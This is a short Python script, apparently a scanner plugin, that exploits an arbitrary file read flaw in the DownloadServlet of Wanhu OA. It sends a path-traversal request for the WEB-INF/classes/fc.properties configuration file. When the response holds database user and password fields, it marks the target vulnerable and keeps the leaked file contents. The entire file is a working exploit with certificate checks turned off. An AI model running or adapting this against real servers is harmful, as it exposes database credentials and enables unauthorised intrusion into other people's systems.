#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/rq_MzH9mQ7r5pGWdv2qFhw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '万户OA DownloadServlet 任意文件读取',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/defaultroot/DownloadServlet?FileName=WEB-INF%2Fclasses%2Ffc.properties&cd=&downloadAll=2&encrypt=x&key=x&modeType=0&name=x&path=..'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'ccerp.user.*?ccerp.password.*?ccerp.maxconn.*?addresssize.*?',res.text,re.S):
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret